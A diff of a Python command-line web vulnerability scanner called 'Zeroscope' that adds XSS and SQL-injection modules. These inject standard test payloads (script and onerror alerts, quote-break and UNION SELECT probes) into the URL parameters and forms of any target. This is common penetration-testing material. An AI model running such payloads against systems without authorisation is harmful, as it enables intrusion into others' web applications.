@@ -1,9 +1,8 @@
 #!/usr/bin/env python3
 import argparse
-import os
-import sys
 import requests
-from urllib.parse import urlparse, urljoin
+import time
+from urllib.parse import urlparse, parse_qs, urljoin
 from bs4 import BeautifulSoup
 from colorama import init, Fore, Style
 
@@ -11,119 +10,170 @@ from colorama import init, Fore, Style
 init(autoreset=True)
 
 class Scanner:
-    def __init__(self, url, verbose=False):
-        self.target_url = url
-        self.verbose = verbose
+    def __init__(self):
         self.session = requests.Session()
-        self.links = set()
-        self.vulnerabilities = []
+        self.session.headers.update({'User-Agent': 'Zeroscope/1.0'})
 
-    def extract_links(self):
-        try:
-            response = self.session.get(self.target_url)
-            soup = BeautifulSoup(response.text, "html.parser")
-            for link in soup.find_all('a', href=True):
-                href = link['href']
-                full_url = urljoin(self.target_url, href)
-                self.links.add(full_url)
-            if self.verbose:
-                print(f"{Fore.CYAN}[*] Found {len(self.links)} links on page{Style.RESET_ALL}")
-        except Exception as e:
-            print(f"{Fore.RED}[!] Error extracting links: {e}{Style.RESET_ALL}")
-
-    def scan_xss(self):
+    def scan_xss(self, url, verbose=False, output_file=None):
+        """Scan for XSS vulnerabilities"""
+        print(f"\n{Fore.CYAN}[*] Starting XSS Scan{Style.RESET_ALL}")
+        
         payloads = [
             '<script>alert(1)</script>',
             '<img src=x onerror=alert(1)>',
-            '"><script>alert(1)</script>'
+            '" onmouseover=alert(1) x="',
+            'javascript:alert(1)'
         ]
         
-        for url in self.links:
-            try:
-                # Test URL parameters
-                parsed = urlparse(url)
-                if parsed.query:
-                    for payload in payloads:
-                        modified = parsed._replace(query=f"{parsed.query}&test={payload}")
-                        test_url = modified.geturl()
+        # Test URL parameters
+        parsed = urlparse(url)
+        params = parse_qs(parsed.query)
+        
+        if params:
+            print(f"{Fore.BLUE}[*] Testing URL parameters{Style.RESET_ALL}")
+            for param in params:
+                for payload in payloads:
+                    try:
+                        test_params = params.copy()
+                        test_params[param] = payload
+                        test_url = parsed._replace(query=None).geturl()
+                        query_str = "&".join(f"{k}={v[0]}" for k,v in test_params.items())
+                        test_url += f"?{query_str}"
+                        
+                        if verbose:
+                            print(f"Testing: {test_url}")
+                            
                         response = self.session.get(test_url)
                         
                         if payload in response.text:
-                            self.vulnerabilities.append({
-                                'type': 'Reflected XSS',
-                                'url': test_url,
-                                'parameter': 'test',
-                                'payload': payload
-                            })
-                            print(f"{Fore.GREEN}[+] XSS found in {url}{Style.RESET_ALL}")
-                            print(f"Payload: {payload}")
-                
-                # Test forms
-                response = self.session.get(url)
-                soup = BeautifulSoup(response.text, "html.parser")
-                for form in soup.find_all('form'):
-                    form_details = self.analyze_form(form)
-                    for payload in payloads:
-                        if self.test_form_xss(url, form_details, payload):
-                            self.vulnerabilities.append({
-                                'type': 'Stored XSS',
-                                'url': url,
-                                'form': form_details,
-                                'payload': payload
-                            })
-            except Exception as e:
-                if self.verbose:
-                    print(f"{Fore.YELLOW}[!] Error scanning {url}: {e}{Style.RESET_ALL}")
+                            msg = f"{Fore.GREEN}[+] XSS found in parameter: {param}{Style.RESET_ALL}"
+                            msg += f"\nPayload: {payload}\nURL: {test_url}\n"
+                            print(msg)
+                            
+                            if output_file:
+                                with open(output_file, 'a') as f:
+                                    f.write(msg + "\n")
+                                    
+                    except Exception as e:
+                        if verbose:
+                            print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
 
-    def analyze_form(self, form):
+        # Test forms
+        try:
+            response = self.session.get(url)
+            soup = BeautifulSoup(response.text, 'html.parser')
+            forms = soup.find_all('form')
+            
+            if forms:
+                print(f"{Fore.BLUE}[*] Testing forms{Style.RESET_ALL}")
+                for form in forms:
+                    form_details = self._analyze_form(form, url)
+                    for payload in payloads:
+                        if self._test_form_xss(form_details, payload, verbose):
+                            msg = f"{Fore.GREEN}[+] XSS found in form{Style.RESET_ALL}"
+                            msg += f"\nAction: {form_details['action']}"
+                            msg += f"\nMethod: {form_details['method']}"
+                            msg += f"\nPayload: {payload}\n"
+                            print(msg)
+                            
+                            if output_file:
+                                with open(output_file, 'a') as f:
+                                    f.write(msg + "\n")
+                                    
+        except Exception as e:
+            if verbose:
+                print(f"{Fore.RED}[!] Error scanning forms: {e}{Style.RESET_ALL}")
+
+    def scan_sqli(self, url, verbose=False, output_file=None):
+        """Scan for SQL injection vulnerabilities"""
+        print(f"\n{Fore.CYAN}[*] Starting SQLi Scan{Style.RESET_ALL}")
+        
+        payloads = [
+            "'",
+            '"',
+            "' OR '1'='1",
+            '" OR "1"="1',
+            "' OR 1=1-- -",
+            "' UNION SELECT null,version(),3-- -"
+        ]
+        
+        parsed = urlparse(url)
+        params = parse_qs(parsed.query)
+        
+        if params:
+            for param in params:
+                for payload in payloads:
+                    try:
+                        test_params = params.copy()
+                        test_params[param] = payload
+                        test_url = parsed._replace(query=None).geturl()
+                        query_str = "&".join(f"{k}={v[0]}" for k,v in test_params.items())
+                        test_url += f"?{query_str}"
+                        
+                        start_time = time.time()
+                        response = self.session.get(test_url)
+                        elapsed = time.time() - start_time
+                        
+                        # Error-based detection
+                        error_indicators = [
+                            'SQL syntax',
+                            'MySQL',
+                            'PostgreSQL',
+                            'ORA-',
+                            'unclosed quotation'
+                        ]
+                        
+                        if any(indicator in response.text for indicator in error_indicators):
+                            msg = f"{Fore.GREEN}[+] SQLi found in parameter: {param}{Style.RESET_ALL}"
+                            msg += f"\nPayload: {payload}"
+                            msg += f"\nURL: {test_url}\n"
+                            print(msg)
+                            
+                            if output_file:
+                                with open(output_file, 'a') as f:
+                                    f.write(msg + "\n")
+                                    
+                    except Exception as e:
+                        if verbose:
+                            print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
+
+    def _analyze_form(self, form, base_url):
+        """Extract form details"""
         details = {}
-        details['action'] = form.get('action')
+        details['action'] = urljoin(base_url, form.get('action', ''))
         details['method'] = form.get('method', 'get').lower()
         details['inputs'] = []
         
         for input_tag in form.find_all('input'):
-            input_details = {
+            details['inputs'].append({
                 'type': input_tag.get('type', 'text'),
                 'name': input_tag.get('name'),
                 'value': input_tag.get('value', '')
-            }
-            details['inputs'].append(input_details)
+            })
             
         return details
 
-    def test_form_xss(self, url, form_details, payload):
-        target_url = urljoin(url, form_details['action'])
+    def _test_form_xss(self, form_details, payload, verbose=False):
+        """Test a form for XSS"""
         data = {}
-        
-        for input in form_details['inputs']:
-            if input['type'] == 'text' or input['type'] == 'search':
-                data[input['name']] = payload
+        for input_field in form_details['inputs']:
+            if input_field['type'] in ('text', 'search', 'textarea'):
+                data[input_field['name']] = payload
             else:
-                data[input['name']] = input['value']
-        
+                data[input_field['name']] = input_field['value']
+                
         try:
             if form_details['method'] == 'post':
-                response = self.session.post(target_url, data=data)
+                response = self.session.post(form_details['action'], data=data)
             else:
-                response = self.session.get(target_url, params=data)
-            
+                response = self.session.get(form_details['action'], params=data)
+                
             return payload in response.text
-        except:
+            
+        except Exception as e:
+            if verbose:
+                print(f"{Fore.RED}[!] Form test error: {e}{Style.RESET_ALL}")
             return False
-
-    def generate_report(self):
-        print(f"\n{Fore.BLUE}=== Scan Report ==={Style.RESET_ALL}")
-        print(f"Target URL: {self.target_url}")
-        print(f"Scanned Links: {len(self.links)}")
-        print(f"Vulnerabilities Found: {len(self.vulnerabilities)}\n")
-        
-        for vuln in self.vulnerabilities:
-            print(f"{Fore.RED}[!] {vuln['type']}{Style.RESET_ALL}")
-            print(f"URL: {vuln['url']}")
-            print(f"Payload: {vuln['payload']}")
-            if 'parameter' in vuln:
-                print(f"Parameter: {vuln['parameter']}")
-            print("-" * 50)
 
 def show_banner():
     banner = f"""
@@ -146,45 +196,36 @@ def show_disclaimer():
     confirm = input(f"{Fore.YELLOW}[?] Do you agree to use this tool responsibly? (y/N): {Style.RESET_ALL}")
     if confirm.lower() != 'y':
         print(f"{Fore.RED}[!] Exiting...{Style.RESET_ALL}")
-        sys.exit(0)
+        exit()
 
 def main():
     show_banner()
     show_disclaimer()
     
     parser = argparse.ArgumentParser(description='Zeroscope - Web Application Penetration Testing Tool')
-    parser.add_argument('-u', '--url', required=True, help='Target URL')
-    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
-    parser.add_argument('-o', '--output', help='Output file for report')
+    subparsers = parser.add_subparsers(dest='module', required=True, help='Select scan type')
+    
+    # XSS Parser
+    xss_parser = subparsers.add_parser('xss', help='XSS Scanner')
+    xss_parser.add_argument('-u', '--url', required=True, help='Target URL')
+    xss_parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
+    xss_parser.add_argument('-o', '--output', help='Output file')
+    
+    # SQLi Parser
+    sqli_parser = subparsers.add_parser('sqli', help='SQL Injection Scanner')
+    sqli_parser.add_argument('-u', '--url', required=True, help='Target URL')
+    sqli_parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
+    sqli_parser.add_argument('-o', '--output', help='Output file')
     
     args = parser.parse_args()
+    scanner = Scanner()
     
-    scanner = Scanner(args.url, args.verbose)
-    print(f"{Fore.CYAN}[*] Starting scan on {args.url}{Style.RESET_ALL}")
+    if args.module == 'xss':
+        scanner.scan_xss(args.url, args.verbose, args.output)
+    elif args.module == 'sqli':
+        scanner.scan_sqli(args.url, args.verbose, args.output)
     
-    # Extract all links from the target page
-    scanner.extract_links()
-    
-    # Add the target URL itself to the scan list
-    scanner.links.add(args.url)
-    
-    # Perform XSS scanning
-    print(f"{Fore.CYAN}[*] Scanning for XSS vulnerabilities{Style.RESET_ALL}")
-    scanner.scan_xss()
-    
-    # Generate report
-    scanner.generate_report()
-    
-    if args.output:
-        with open(args.output, 'w') as f:
-            f.write(f"Scan Report for {args.url}\n\n")
-            for vuln in scanner.vulnerabilities:
-                f.write(f"Vulnerability: {vuln['type']}\n")
-                f.write(f"URL: {vuln['url']}\n")
-                f.write(f"Payload: {vuln['payload']}\n\n")
-        print(f"{Fore.GREEN}[+] Report saved to {args.output}{Style.RESET_ALL}")
-    
-    print(f"{Fore.GREEN}[+] Scan completed!{Style.RESET_ALL}")
+    print(f"\n{Fore.GREEN}[+] Scan completed!{Style.RESET_ALL}")
 
 if __name__ == '__main__':
     main()
